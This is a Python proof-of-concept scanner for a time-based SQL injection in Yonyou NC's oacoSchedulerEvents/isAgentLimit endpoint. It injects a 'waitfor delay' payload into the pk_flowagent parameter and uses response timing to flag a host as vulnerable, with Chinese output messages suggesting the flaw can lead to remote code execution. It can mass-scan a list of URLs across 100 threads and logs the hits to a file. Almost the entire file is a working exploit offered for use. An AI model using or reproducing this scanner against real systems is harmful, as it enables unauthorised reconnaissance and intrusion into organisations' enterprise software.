import requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
                                                                               ______
        ______________________________________________ ___  /
        ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
        __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
        _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
        /_/                                              
                                              author:lly
                                              date:2024-09-12
                                              version:1.0                    
        """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='用友NC oacoSchedulerEventsisAgentLimit SQL注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(url):
    try:
        attack_url = url.rstrip('/') + "/portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:3'--"
  
        start_time = time.time()
        response = requests.get(attack_url, verify=False, timeout=10)
        elapsed_time = time.time() - start_time
  
        if 3 < elapsed_time < 5 and response.status_code ==200:
            print(f"URL [{url}] 可能存在用友NC /oacoSchedulerEvents/isAgentLimit SQL注入致RCE漏洞")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(url+"\n")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

if __name__ == '__main__':
    main()